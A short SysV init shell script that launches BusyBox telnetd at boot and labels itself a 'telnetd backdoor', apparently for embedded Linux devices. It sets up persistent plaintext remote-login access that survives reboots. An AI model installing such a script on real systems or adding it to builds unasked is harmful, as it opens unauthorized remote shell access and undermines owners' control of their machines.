#!/bin/sh

### BEGIN INIT INFO
# Provides:          busybox_telnetd
# Required-Start:    $local_fs
# Required-Stop:
# Default-Start:     2 3 4 5
# Default-Stop:
# Short-Description: busybox telnetd
# Description:       telnetd backdoor
### END INIT INFO

. /lib/lsb/init-functions

[ -f /etc/default/rcS ] && . /etc/default/rcS
PATH=/bin:/usr/bin:/sbin:/usr/sbin
PROGRAM=/bin/busybox

test -x $PROGRAM || exit 0

case "$1" in
  start)
        log_begin_msg "Starting busybox telnetd backdoor"
                /bin/busybox telnetd
        log_end_msg $?
        ;;
  stop)
        killall busybox
	;;
  force-reload|restart)
        $0 start
        ;;
  *)
        log_success_msg "Usage: /etc/init.d/telnetd {start|stop|restart|force-reload}"
        exit 1
esac

exit 0

